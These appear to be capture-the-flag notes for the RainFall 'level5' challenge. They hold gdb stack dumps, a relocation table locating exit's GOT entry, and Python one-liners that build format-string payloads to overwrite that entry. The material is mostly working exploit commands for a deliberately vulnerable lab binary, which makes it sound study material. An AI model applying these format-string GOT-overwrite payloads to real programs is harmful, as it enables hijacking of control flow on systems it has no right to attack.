```sh
(gdb) x/80x $esp
0xbffff510:	0xbffff520	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff520:	0x41414141	0xb7e2000a	0x00000001	0xb7fef305
0xbffff530:	0xbffff588	0xb7fde2d4	0xb7fde334	0x00000007
```

```sh
level5@RainFall:~$ python -c "print('\x41\x41\x41\x41' + '%4\$x')" | ./level5 
AAAA41414141
```

```sh
level5@RainFall:~$ objdump -R level5 

level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
<08049838 R_386_JUMP_SLOT   exit >
0804983c R_386_JUMP_SLOT   __libc_start_main
```

```sh
(gdb) x/x &o
0x80484a4 <o>:	0x83e58955
```

[control EIP with string format exploit (doc)](https://samsclass.info/127/proj/p6a-fs.htm)

python -c "print('\x38\x98\x04\x08' + '\x39\x98\x04\x08' + '%4\$n%x%n')" > /tmp/test5

python -c "print('\x38\x98\x04\x08' + '\x39\x98\x04\x08' + '%256\$x' + '%4\$n')" > /tmp/test5

python -c "print('\x38\x98\x04\x08\x39\x98\x04\x08\x3a\x98\x04\x08\x3b\x98\x04\x08' + '%1$148x' + '%4\$n' + '%5\$n' + '%6\$n' + '%7\$n')" > /tmp/test5
